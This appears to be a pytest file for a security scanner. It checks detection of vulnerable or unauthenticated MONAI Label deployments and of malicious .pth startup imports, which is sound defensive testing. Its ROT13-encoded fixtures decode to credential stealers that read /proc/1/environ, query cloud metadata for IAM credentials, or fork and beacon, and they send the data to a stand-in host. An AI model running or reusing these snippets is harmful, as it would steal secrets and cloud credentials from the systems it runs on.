"""MONAI Label in the AI-stack checks (Cairn, CVE-2026-133968) and the rest of feat-pth-import-target-scan
(agent-framework 1.26.x: /proc/*/environ, cloud metadata, fork/setsid detachment in the imported module).

The stealer-shaped startup modules are stored ROT13-encoded and decoded at test time (see test_pthtargets.py).
"""
import codecs
import textwrap
from pathlib import Path

import pytest

from asca import aistack, pystartup
from asca.model import Severity

SAMPLES = {'proc_environ': "vzcbeg bf, heyyvo.erdhrfg\nqngn = bcra('/cebp/1/raiveba', 'eo').ernq()\nheyyvo.erdhrfg.heybcra('uggcf://rknzcyr.vainyvq/p', qngn=qngn)\n", 'imds': "vzcbeg wfba, heyyvo.erdhrfg\ngbx = heyyvo.erdhrfg.heybcra('uggc://169.254.169.254/yngrfg/zrgn-qngn/vnz/frphevgl-perqragvnyf/').ernq()\n", 'detach': "vzcbeg bf, heyyvo.erdhrfg\nvs bf.sbex() == 0:\n    bf.frgfvq()\n    heyyvo.erdhrfg.heybcra('uggcf://rknzcyr.vainyvq/ornpba')\n"}


def sample(name: str) -> str:
    return codecs.decode(SAMPLES[name], "rot13")


def _w(p: Path, text: str) -> Path:
    p.parent.mkdir(parents=True, exist_ok=True)
    p.write_text(textwrap.dedent(text), encoding="utf-8")
    return p


@pytest.fixture
def home(tmp_path):
    h = tmp_path / "home"
    h.mkdir()
    return h


def _run(home, **kw):
    kw.setdefault("root", home.parent / "root")
    kw.setdefault("env", {})
    kw.setdefault("sites", [])
    return aistack.audit(home, {}, **kw)


def _got(fs):
    return sorted((f.rule, f.severity.name) for f in fs)


# ---------------------------------------------------------------- MONAI Label
def test_monai_compose_old_tag_no_auth_published_is_critical_three_ways(home):
    _w(home / "monai" / "docker-compose.yml", """\
        services:
          monailabel:
            image: projectmonai/monailabel:0.8.5
            ports:
              - "8000:8000"
            command: monailabel start_server --app /apps/radiology --studies /data
        """)
    fs = _run(home)
    got = _got(fs)
    assert ("aistack.vulnerable-version", "CRITICAL") in got
    assert ("aistack.auth-disabled", "CRITICAL") in got
    assert ("aistack.port-exposed", "MEDIUM") in got
    v = next(f for f in fs if f.rule == "aistack.vulnerable-version")
    assert "CVE-2026-133968" in v.title and "0.8.8" in v.remediation and "cairn" in v.detail.lower()
    a = next(f for f in fs if f.rule == "aistack.auth-disabled")
    assert "isn't set" in a.title and "published" in a.title


@pytest.mark.parametrize("tag,ids", [("0.8.5", "CVE-2026-133968"), ("0.8.6", "GHSA-j5c7"), ("0.8.7", "GHSA-j5c7"),
                                     ("0.8.8", None), ("0.9.0", None), ("latest", None)])
def test_monai_image_tag_ranges(home, tag, ids):
    _w(home / "m" / "compose.yaml", f"services:\n  m:\n    image: projectmonai/monailabel:{tag}\n"
                                    f"    environment:\n      MONAI_LABEL_AUTH_ENABLE: 'True'\n")
    vulns = [f for f in _run(home) if f.rule == "aistack.vulnerable-version"]
    assert [ids in f.title for f in vulns] == ([True] if ids else [])


def test_monai_auth_enabled_on_loopback_is_quiet_and_env_file_counts(home):
    _w(home / "m" / "compose.yaml", "services:\n  m:\n    image: projectmonai/monailabel:0.8.8\n"
                                    "    ports:\n      - '127.0.0.1:8000:8000'\n"
                                    "    environment:\n      - MONAI_LABEL_AUTH_ENABLE=true\n")
    assert _got(_run(home)) == []
    _w(home / "srv" / ".env", "MONAI_LABEL_STUDIES=/data\nMONAI_LABEL_AUTH_ENABLE=False\n")
    fs = [f for f in _run(home) if f.rule == "aistack.auth-disabled"]
    assert [(f.severity, "is off" in f.title) for f in fs] == [(Severity.HIGH, True)]


def test_monai_built_locally_is_recognised_by_its_command(home):
    _w(home / "app" / "docker-compose.yml", """\
        services:
          monailabel:
            build:
              context: ./monailabel
            ports:
              - 8000:8000
            command: monailabel start_server --app apps/monaibundle --studies datastore
        """)
    got = _got(_run(home))
    assert ("aistack.auth-disabled", "CRITICAL") in got and ("aistack.port-exposed", "MEDIUM") in got


def test_monai_loopback_only_is_medium_and_env_file_switch_is_read(home):
    _w(home / "m" / "compose.yaml", "services:\n  m:\n    image: projectmonai/monailabel:0.8.8\n"
                                    "    ports:\n      - '127.0.0.1:8000:8000'\n")
    assert _got(_run(home)) == [("aistack.auth-disabled", "MEDIUM")]
    _w(home / "m" / "compose.yaml", "services:\n  m:\n    image: projectmonai/monailabel:0.8.8\n"
                                    "    env_file: monai.env\n    ports:\n      - '8000:8000'\n")
    _w(home / "m" / "monai.env", "MONAI_LABEL_AUTH_ENABLE=True\n")
    assert _got(_run(home)) == [("aistack.port-exposed", "MEDIUM")]


@pytest.mark.parametrize("ver,vuln", [("0.8.5", True), ("0.8.7", True), ("0.8.8", False)])
def test_monai_site_packages(home, ver, vuln):
    site = home / "venv" / "lib" / "python3.12" / "site-packages"
    _w(site / f"monailabel-{ver}.dist-info" / "METADATA", f"Metadata-Version: 2.1\nName: monailabel\nVersion: {ver}\n\n")
    fs = _run(home, sites=[pystartup.Site(site, "venv")])
    assert any(f.rule == "aistack.vulnerable-version" and f.severity == Severity.CRITICAL for f in fs) is vuln


# ---------------------------------------------------------------- .pth import targets (agent-framework shapes)
@pytest.mark.parametrize("name", ["proc_environ", "imds", "detach"])
def test_import_target_reading_process_environ_metadata_or_detaching_is_high(tmp_path, name):
    sp = tmp_path / "venv" / "lib" / "python3.12" / "site-packages"
    sp.mkdir(parents=True)
    (sp / "zz_diag.pth").write_text("import zz_diag\n", encoding="utf-8")
    (sp / "zz_diag.py").write_text(sample(name), encoding="utf-8")
    fs = [f for f in pystartup.audit([pystartup.Site(sp, "venv")], {}) if f.rule == "python.pth-import-target"]
    assert any(f.severity == Severity.HIGH for f in fs), [(f.severity, f.title) for f in fs]
